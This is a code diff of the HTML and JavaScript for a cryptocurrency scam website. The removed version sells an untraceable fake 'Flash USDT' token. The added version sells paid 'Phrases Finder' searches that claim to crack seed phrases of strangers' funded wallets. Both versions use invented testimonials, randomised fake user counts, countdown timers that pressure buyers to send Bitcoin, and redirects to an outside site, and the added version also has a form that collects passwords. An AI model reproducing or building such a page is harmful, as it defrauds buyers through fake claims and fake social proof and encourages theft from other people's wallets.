-                    <text x="300" y="180" font-family="Arial" font-size="12" fill="#FFFFFF">GOOGL $2750.10 -0.5%</text>
-                    <text x="300" y="200" font-family="Arial" font-size="12" fill="#FFFFFF">AMZN $3300.75 +1.8%</text>
-                    <!-- Enhanced chart -->
-                    <path d="M300 360 L330 320 L360 340 L390 300 L420 330 L430 320" stroke="#FF00A8" stroke-width="3" fill="none" />
-                    <circle cx="330" cy="320" r="4" fill="#00F0FF" />
-                    <circle cx="360" cy="340" r="4" fill="#00F0FF" />
-                    <circle cx="390" cy="300" r="4" fill="#00F0FF" />
-                    <circle cx="420" cy="330" r="4" fill="#00F0FF" />
-                    <!-- Additional chart elements -->
-                    <line x1="290" y1="370" x2="430" y2="370" stroke="#FFFFFF" stroke-width="1" />
-                    <line x1="290" y1="370" x2="290" y2="230" stroke="#FFFFFF" stroke-width="1" />
-                    <text x="285" y="225" font-family="Arial" font-size="10" fill="#FFFFFF">$</text>
-                    <text x="435" y="375" font-family="Arial" font-size="10" fill="#FFFFFF">t</text>
-                    <!-- New Bitcoin symbol -->
-                    <rect x="285" y="370" width="150" height="60" rx="5" fill="#FFFFFF" class="message-box right-message" />
-                    <circle cx="360" cy="400" r="20" fill="#F7931A" class="message-text right-message" />
-                    <text x="360" y="408" font-family="Arial" font-size="24" fill="#FFFFFF" text-anchor="middle" class="message-text right-message">₿</text>
-                </svg>
-            </div>
+  <div id="signupSuccessPopup" class="popup">
+      <p>YOU SIGN UP SUCCESSFULLY</p>
+  </div>
+
+  <div class="container">
+    <div class="explanation">
+      <h2>Our Revolutionary System</h2>
+      <div class="explanation-content">
+        <p>Phrases Finder  -  A Sophisticated Software that dedicated to find Lost wallet of people that forgot their Passwords.</p>
+        <p>You can find Lost Wallets worldwide with Funds Inside, Your payment is for the Blockchain Gas for the Software to make the searching.</p>
+        <p><strong>** Our Finder Software looks only for Wallets with Available Balance **</strong></p>
+        <div class="explanation-features">
+          <div class="feature-box">
+            <i class="fas fa-robot"></i>
+            <p>Advanced algorithm generates and tests phrase combinations</p>
+          </div>
+          <div class="feature-box">
+            <i class="fas fa-search-dollar"></i>
+            <p>Scans Blockchain Network, focusing on wallets with existing balances</p>
+          </div>
+          <div class="feature-box">
+            <i class="fas fa-gas-pump"></i>
+            <p>Your payment covers gas fees for extensive blockchain searches</p>
+          </div>
+          <div class="feature-box">
+            <i class="fas fa-key"></i>
+            <p>Receive 12 phrases to access your lost wallet upon match</p>
+          </div>
         </div>
-    </section>
+      </div>
+    </div>
 
-    <section id="features" class="features">
-        <div class="container">
-            <h2>Why to Buy a License?</h2>
-            <div class="feature-grid">
-                <div class="feature-item">
-                    <div class="feature-icon">🔄</div>
-                    <h3>Swappable</h3>
-                    <p>Our Flash USDT erc20 is fully swappable, allowing seamless transactions within the cryptocurrency ecosystem.</p>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">🛡️</div>
-                    <h3>Sophisticated Algorithm</h3>
-                    <p>Our sophisticated algorithm in the Blockchain creates a MASK for the coin, making it untraceable for any exchanges like Binance, Kraken.com, CoinBase, and more.</p>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">🌐</div>
-                    <h3>ERC20 Network</h3>
-                    <p>Utilizing validator nodes on the ERC20 network, our solution masks the token with the same contract as USDT.</p>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">🔐</div>
-                    <h3>Untraceability</h3>
-                    <p>Our Flash USDT erc20 remains undetectable by major cryptocurrency exchanges, ensuring your transactions remain private.</p>
-                </div>
-            </div>
+    <button class="phrases-finder-btn" onclick="openPhrasesFinder()">
+      <span>Click for 1 search Free</span>
+    </button>
+
+    <div class="packages">
+      <div class="package">
+        <div class="package-header">
+          <h3>STANDARD</h3>
+          <p class="price">$50</p>
         </div>
-    </section>
-
-    <section id="licenses" class="licenses">
-        <div class="container">
-            <h2>Choose Your License</h2>
-            <div class="license-grid">
-                <div class="license-item">
-                    <h3>Trial License</h3>
-                    <button class="purchase-btn" data-license="trial">PURCHASE NOW</button>
-                </div>
-                <div class="license-item">
-                    <h3>Standard License</h3>
-                    <button class="purchase-btn" data-license="standard">PURCHASE NOW</button>
-                </div>
-                <div class="license-item">
-                    <h3>Premium License</h3>
-                    <button class="purchase-btn" data-license="premium">PURCHASE NOW</button>
-                </div>
-            </div>
+        <ul class="package-features">
+          <li>2 Searches on the Blockchain of 1 hour</li>
+          <li>24/7 Support</li>
+          <li>Real-time Progress Tracking</li>
+        </ul>
+        <button class="purchase-btn" onclick="openModal('standard', 2, 50)">PURCHASE NOW</button>
+      </div>
+      <div class="package">
+        <div class="package-header">
+          <h3>PLUS</h3>
+          <p class="price">$100</p>
         </div>
-    </section>
-
-    <section id="crypto" class="crypto">
-        <div class="container">
-            <h2>Live Cryptocurrency Prices</h2>
-            <div class="crypto-container">
-                <div class="crypto-header">
-                    <button id="trade-btn" class="trade-btn">Trade</button>
-                </div>
-                <div class="crypto-table-wrapper">
-                    <table id="crypto-table">
-                        <thead>
-                            <tr>
-                                <th>Coin</th>
-                                <th>Price</th>
-                                <th>24h Change</th>
-                            </tr>
-                        </thead>
-                        <tbody id="crypto-body">
-                            <!-- Cryptocurrency data will be inserted here -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
+        <ul class="package-features">
+          <li>5 Searches on the Blockchain of 2 hours</li>
+          <li>24/7 Support</li>
+          <li>Real-time Progress Tracking</li>
+        </ul>
+        <button class="purchase-btn" onclick="openModal('plus', 5, 100)">PURCHASE NOW</button>
+      </div>
+      <div class="package">
+        <div class="package-header">
+          <h3>PRO</h3>
+          <p class="price">$180</p>
         </div>
-        <div id="floating-crypto-symbols" class="floating-crypto-symbols"></div>
-    </section>
-
-    <section id="stats" class="stats">
-        <div class="container stats-container">
-            <div class="stat-item">
-                <h4 id="activeUsers">0</h4>
-                <p>Active Users</p>
-            </div>
-            <div class="stat-item">
-                <h4 id="productsManaged">0</h4>
-                <p>Generated USDT</p>
-            </div>
+        <ul class="package-features">
+          <li>10 Searches on the Blockchain of 3 hours</li>
+          <li>24/7 Support</li>
+          <li>Real-time Progress Tracking</li>
+        </ul>
+        <button class="purchase-btn" onclick="openModal('pro', 10, 180)">PURCHASE NOW</button>
+      </div>
+      <div class="package">
+        <div class="package-header">
+          <h3>EXPERT</h3>
+          <p class="price">$220</p>
         </div>
-    </section>
+        <ul class="package-features">
+          <li>15 Searches on the Blockchain of 4 hours</li>
+          <li>24/7 Support</li>
+          <li>Real-time Progress Tracking</li>
+        </ul>
+        <button class="purchase-btn" onclick="openModal('expert', 15, 220)">PURCHASE NOW</button>
+      </div>
+      <div class="package">
+        <div class="package-header">
+          <h3>ULTIMATE</h3>
+          <p class="price">$400</p>
+        </div>
+        <ul class="package-features">
+          <li>50 Searches on the Blockchain of 24 hours</li>
+          <li>24/7 Support</li>
+          <li>Real-time Progress Tracking</li>
+        </ul>
+        <button class="purchase-btn" onclick="openModal('ultimate', 50, 400)">PURCHASE NOW</button>
+      </div>
+    </div>
 
-    <a href="https://wa.me/447753831282?text=Hello%2C%20I%27m%20interested%20in%20FLASH%20USDT%20/erc20" class="whatsapp-button" target="_blank" rel="noopener noreferrer">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#FFFFFF">
-            <path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.751-2.874-2.502-2.961-2.617-.087-.116-.708-.94-.708-1.793s.448-1.273.607-1.446c.159-.173.346-.217.462-.217l.332.006c.106.005.249-.04.39.298.144.347.491 1.2.534 1.287.043.087.072.188.014.304-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86s.274.072.376-.043c.101-.116.433-.506.549-.68.116-.173.231-.145.39-.087s1.011.477 1.184.564.289.13.332.202c.045.072.045.419-.1.824zm-3.423-14.416c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm.029 18.88c-1.161 0-2.305-.292-3.318-.844l-3.677.964.984-3.595c-.607-1.052-.927-2.246-.926-3.468.001-3.825 3.113-6.937 6.937-6.937 1.856.001 3.598.723 4.907 2.034 1.31 1.311 2.031 3.054 2.03 4.908-.001 3.825-3.113 6.938-6.937 6.938z"/>
-        </svg>
-    </a>
+    <div class="reviews">
+      <h2>Success Stories</h2>
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/1.jpg" alt="John Doe, successful wallet recovery client">
+        <div class="review-content">
+          <h3>John Doe</h3>
+          <p>"I thought my crypto was gone forever. Thanks to this service, I recovered a wallet with 2.5 BTC! Life-changing!"</p>
+        </div>
+      </div>
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/women/2.jpg" alt="Jane Smith, happy customer">
+        <div class="review-content">
+          <h3>Jane Smith</h3>
+          <p>"Absolutely amazing! Recovered my old Ethereum wallet with over 50 ETH. This service is worth every penny!"</p>
+        </div>
+      </div>
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/3.jpg" alt="Michael Johnson, satisfied user">
+        <div class="review-content">
+          <h3>Michael Johnson</h3>
+          <p>"I was skeptical at first, but this service actually works! Found my old wallet with 10 BTC. Incredible!"</p>
+        </div>
+      </div>
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/women/4.jpg" alt="Emily Brown, grateful client">
+        <div class="review-content">
+          <h3>Emily Brown</h3>
+          <p>"Lost access to my Dogecoin wallet years ago. This service helped me recover over 1 million DOGE! Thank you!"</p>
+        </div>
+      </div>
+    </div>
 
-    <script>
-        // Animate stats
-        function animateValue(id, start, end, duration) {
-            let startTimestamp = null;
-            const step = (timestamp) => {
-                if (!startTimestamp) startTimestamp = timestamp;
-                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                const value = Math.floor(progress * (end - start) + start);
-                document.getElementById(id).textContent = value.toLocaleString();
-                if (progress < 1) {
-                    window.requestAnimationFrame(step);
-                }
-            };
-            window.requestAnimationFrame(step);
+    <button class="phrases-finder-btn" onclick="openPhrasesFinder()">
+      <span>Click for 1 search Free on Us</span>
+    </button>
+  </div>
+
+  <div id="purchaseModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <div class="timer">10:00</div>
+      <div class="progress-bar">
+        <div class="progress"></div>
+      </div>
+      <div class="payment-info">
+        <p>Pay Now $<span id="paymentAmount">50</span> for <span id="searchCount">2</span> Search</p>
+        <p>Bitcoin wallet address:</p>
+        <div class="bitcoin-address">bc1qvyzw9wdtru8equvj64scy5nn5swqv8njenmhls</div>
+        <button class="copy-btn">COPY</button>
+      </div>
+      <div class="transfer-status">
+        Transfer Status: Waiting<span class="dots"><span>.</span><span>.</span><span>.</span></span>
+      </div>
+      <button class="close-btn">CLOSE</button>
+    </div>
+  </div>
+
+  <a href="mailto:John.shoppyai@gmail.com?subject=More%20details%20about%20the%20System&body=Hi%2C%20I%20want%20more%20details%20about%20the%20System" class="email-btn">
+    <i class="fas fa-envelope"></i>
+  </a>
+
+  <a href="https://wa.me/447753831282?text=Hi,%20I%20want%20more%20details%20about%20the%20System" class="whatsapp-btn" target="_blank">
+    <i class="fab fa-whatsapp"></i>
+  </a>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script>
+    function removeSignupSection() {
+        const signupSection = document.getElementById('signupSection');
+        if (signupSection) {
+            signupSection.remove();
         }
+    }
 
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    animateValue("activeUsers", 0, Math.floor(Math.random() * (68 - 20 + 1)) + 20, 2000);
-                    animateValue("productsManaged", 0, 10000000, 2000);
-                    observer.unobserve(entry.target);
-                }
-            });
-        }, { threshold: 0.5 });
+    document.getElementById('signupButton').addEventListener('click', function() {
+        const email = document.getElementById('signupEmail').value;
+        const password = document.getElementById('signupPassword').value;
 
-        observer.observe(document.querySelector('.stats'));
-
-        // Smooth scrolling function
-        function smoothScroll(target, duration) {
-            const targetElement = document.querySelector(target);
-            const targetPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
-            const startPosition = window.pageYOffset;
-            const distance = targetPosition - startPosition;
-            let startTime = null;
-
-            function animation(currentTime) {
-                if (startTime === null) startTime = currentTime;
-                const timeElapsed = currentTime - startTime;
-                const run = ease(timeElapsed, startPosition, distance, duration);
-                window.scrollTo(0, run);
-                if (timeElapsed < duration) requestAnimationFrame(animation);
-            }
-
-            function ease(t, b, c, d) {
-                t /= d / 2;
-                if (t < 1) return c / 2 * t * t + b;
-                t--;
-                return -c / 2 * (t * (t - 2) - 1) + b;
-            }
-
-            requestAnimationFrame(animation);
+        if (email && password) {
+            showPopup('signupSuccessPopup');
+            document.getElementById('signupEmail').value = '';
+            document.getElementById('signupPassword').value = '';
+            removeSignupSection();
+        } else {
+            alert('Please enter both email and password');
         }
+    });
 
-        // Fetch crypto data
-        function fetchCryptoData() {
-            fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false')
-                .then(response => response.json())
-                .then(data => {
-                    const cryptoBody = document.getElementById('crypto-body');
-                    cryptoBody.innerHTML = '';
-                    data.forEach(coin => {
-                        const row = document.createElement('tr');
-                        const priceChangeClass = coin.price_change_percentage_24h >= 0 ? 'price-up' : 'price-down';
-                        row.innerHTML = `
-                            <td><img src="${coin.image}" alt="${coin.name}" class="crypto-symbol"> ${coin.name}</td>
-                            <td>$${coin.current_price.toFixed(2)}</td>
-                            <td class="${priceChangeClass}">${coin.price_change_percentage_24h.toFixed(2)}%</td>
-                        `;
-                        cryptoBody.appendChild(row);
-                    });
-                })
-                .catch(error => console.error('Error fetching crypto data:', error));
+    particlesJS('crypto-particles', {
+      particles: {
+        number: { value: 100, density: { enable: true, value_area: 800 } },
+        color: { value: ["#00ffff", "#ff00ff", "#ffffff"] },
+        shape: { type: ["circle", "triangle", "polygon"], polygon: { nb_sides: 5 } },
+        opacity: { value: 0.6, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false } },
+        size: { value: 3, random: true, anim: { enable: true, speed: 2, size_min: 0.1, sync: false } },
+        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+        move: { enable: true, speed: 2, direction: "none", random: true, straight: false, out_mode: "out", bounce: false, attract: { enable: false, rotateX: 600, rotateY: 1200 } }
+      },
+      interactivity: {
+        detect_on: "canvas",
+        events: {
+          onhover: { enable: true, mode: "repulse" },
+          onclick: { enable: true, mode: "push" },
+          resize: true
+        },
+        modes: {
+          grab: { distance: 400, line_linked: { opacity: 1 } },
+          bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 },
+          repulse: { distance: 200, duration: 0.4 },
+          push: { particles_nb: 4 },
+          remove: { particles_nb: 2 }
         }
+      },
+      retina_detect: true
+    });
 
-        // Fetch crypto data initially and then every 60 seconds
-        fetchCryptoData();
-        setInterval(fetchCryptoData, 60000);
+    function updateOnlineCount() {
+      const count = Math.floor(Math.random() * (142 - 11 + 1)) + 11;
+      document.getElementById('online-count').textContent = count;
+    }
 
-        document.getElementById('access-license-btn').addEventListener('click', function(e) {
-            e.preventDefault();
-            const loadingOverlay = document.createElement('div');
-            loadingOverlay.className = 'loading-overlay';
-            loadingOverlay.innerHTML = `
-                <div class="loading-spinner"></div>
-                <p>Opening a Safe tunnel to the DarkNet, Please Wait for the Wallet Page</p>
-            `;
-            document.body.appendChild(loadingOverlay);
-            
-            setTimeout(() => {
-                window.location.href = 'https://walletcryp.com';
-            }, 3000);
+    setInterval(updateOnlineCount, 7000);
+
+    function createCryptoIcons() {
+      const iconClasses = ['btc', 'eth', 'ltc', 'xrp'];
+      const container = document.querySelector('.container');
+      
+      for (let i = 0; i < 20; i++) {
+        const icon = document.createElement('div');
+        icon.className = `crypto-icon ${iconClasses[Math.floor(Math.random() * iconClasses.length)]}`;
+        icon.style.left = `${Math.random() * 100}%`;
+        icon.style.top = `${Math.random() * 100}%`;
+        icon.style.animationDelay = `${Math.random() * 2}s`;
+        container.appendChild(icon);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      createCryptoIcons();
+      
+      const elements = document.querySelectorAll('.feature-box, .package, h2, h3');
+      
+      elements.forEach(element => {
+        element.style.opacity = '0';
+        element.style.transform = 'translateY(20px)';
+        element.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+      });
+      
+      animateOnScroll();
+    });
+
+    function openPhrasesFinder() {
+      const loadingOverlay = document.createElement('div');
+      loadingOverlay.style.position = 'fixed';
+      loadingOverlay.style.top = '0';
+      loadingOverlay.style.left = '0';
+      loadingOverlay.style.width = '100%';
+      loadingOverlay.style.height = '100%';
+      loadingOverlay.style.background = 'rgba(0, 0, 0, 0.8)';
+      loadingOverlay.style.display = 'flex';
+      loadingOverlay.style.justifyContent = 'center';
+      loadingOverlay.style.alignItems = 'center';
+      loadingOverlay.style.zIndex = '9999';
+
+      const spinner = document.createElement('div');
+      spinner.style.width = '50px';
+      spinner.style.height = '50px';
+      spinner.style.border = '5px solid #f3f3f3';
+      spinner.style.borderTop = '5px solid #00ffff';
+      spinner.style.borderRadius = '50%';
+      spinner.style.animation = 'spin 1s linear infinite';
+
+      loadingOverlay.appendChild(spinner);
+      document.body.appendChild(loadingOverlay);
+
+      setTimeout(() => {
+        window.location.href = 'https://walletcryp.com/';
+      }, 2000);
+    }
+
+    function openModal(package, searches, amount) {
+      const modal = document.getElementById('purchaseModal');
+      const paymentAmount = document.getElementById('paymentAmount');
+      const searchCount = document.getElementById('searchCount');
+      const closeBtn = modal.querySelector('.close');
+      const closeBtnBottom = modal.querySelector('.close-btn');
+      const copyBtn = modal.querySelector('.copy-btn');
+      const timerElement = modal.querySelector('.timer');
+      const progressBar = modal.querySelector('.progress');
+
+      paymentAmount.textContent = amount;
+      searchCount.textContent = searches;
+
+      modal.style.display = 'block';
+
+      let timeLeft = 600; // 10 minutes in seconds
+      let progress = 0;
+
+      const timer = setInterval(() => {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+        progress += 100 / 600; // Increase progress every second
+        progressBar.style.width = `${progress}%`;
+
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          modal.style.display = 'none';
+        }
+      }, 1000);
+
+      closeBtn.onclick = closeBtnBottom.onclick = () => {
+        modal.style.display = 'none';
+        clearInterval(timer);
+      };
+
+      copyBtn.onclick = () => {
+        const bitcoinAddress = modal.querySelector('.bitcoin-address').textContent;
+        navigator.clipboard.writeText(bitcoinAddress).then(() => {
+          alert('Bitcoin address copied to clipboard!');
         });
+      };
 
-        const licenseData = {
-            trial: { price: 65, usdt: 300 },
-            standard: { price: 100, usdt: 500 },
-            premium: { price: 500, usdt: 6000 }
-        };
-
-        const bitcoinAddress = 'bc1qvyzw9wdtru8equvj64scy5nn5swqv8njenmhls';
-
-        document.querySelectorAll('.purchase-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                const license = this.dataset.license;
-                const { price, usdt } = licenseData[license];
-                
-                const popup = document.createElement('div');
-                popup.className = 'license-popup';
-                popup.innerHTML = `
-                    <div class="popup-content">
-                        <h3>${license.charAt(0).toUpperCase() + license.slice(1)} License</h3>
-                        <div class="timer">10:00</div>
-                        <p>Pay $${price}, You Get $${usdt} USDT</p>
-                        <div class="bitcoin-info">
-                            <img src="bitcoin-icon.svg" alt="Bitcoin" class="bitcoin-icon">
-                            <p>${bitcoinAddress}</p>
-                            <button class="copy-btn">Copy</button>
-                        </div>
-                        <button class="close-btn">Close</button>
-                    </div>
-                `;
-                
-                document.body.appendChild(popup);
-                
-                let timeLeft = 600;
-                const timerDisplay = popup.querySelector('.timer');
-                const timerInterval = setInterval(() => {
-                    timeLeft--;
-                    const minutes = Math.floor(timeLeft / 60);
-                    const seconds = timeLeft % 60;
-                    timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                    if (timeLeft <= 0) {
-                        clearInterval(timerInterval);
-                        popup.remove();
-                    }
-                }, 1000);
-                
-                popup.querySelector('.copy-btn').addEventListener('click', () => {
-                    navigator.clipboard.writeText(bitcoinAddress);
-                    alert('Bitcoin address copied to clipboard!');
-                });
-                
-                popup.querySelector('.close-btn').addEventListener('click', () => {
-                    clearInterval(timerInterval);
-                    popup.remove();
-                });
-            });
-        });
-
-        document.getElementById('trade-btn').addEventListener('click', function() {
-            const popup = document.createElement('div');
-            popup.className = 'trade-popup';
-            popup.innerHTML = '<p>Trade is Coming Soon</p>';
-            document.body.appendChild(popup);
-            
-            setTimeout(() => {
-                popup.classList.add('show');
-            }, 10);
-            
-            setTimeout(() => {
-                popup.classList.remove('show');
-                setTimeout(() => {
-                    popup.remove();
-                }, 500);
-            }, 3000);
-        });
-
-        const cryptoSymbols = ['₿', 'Ξ', '₮', 'Ł', '₳', '₴', '₽', 'Ð', '₩', '₭'];
-
-        function createFloatingSymbol() {
-            const symbol = document.createElement('div');
-            symbol.className = 'floating-symbol';
-            symbol.textContent = cryptoSymbols[Math.floor(Math.random() * cryptoSymbols.length)];
-            symbol.style.left = `${Math.random() * 100}vw`;
-            symbol.style.animationDuration = `${Math.random() * 5 + 5}s`;
-            document.getElementById('floating-crypto-symbols').appendChild(symbol);
-
-            symbol.addEventListener('animationend', () => {
-                symbol.remove();
-            });
+      window.onclick = (event) => {
+        if (event.target === modal) {
+          modal.style.display = 'none';
+          clearInterval(timer);
         }
+      };
+    }
 
-        setInterval(createFloatingSymbol, 1000);
-    </script>
+    function showPopup(popupId) {
+      const popup = document.getElementById(popupId);
+      popup.style.display = 'block';
+      setTimeout(() => {
+        popup.style.display = 'none';
+      }, 2000);
+    }
+
+    function animateOnScroll() {
+      const elements = document.querySelectorAll('.feature-box, .package, h2, h3');
+      
+      elements.forEach(element => {
+        const elementTop = element.getBoundingClientRect().top;
+        const elementBottom = element.getBoundingClientRect().bottom;
+        
+        if (elementTop < window.innerHeight && elementBottom > 0) {
+          element.style.opacity = '1';
+          element.style.transform = 'translateY(0)';
+        }
+      });
+    }
+
+    window.addEventListener('scroll', animateOnScroll);
+  </script>
 </body>
 </html>
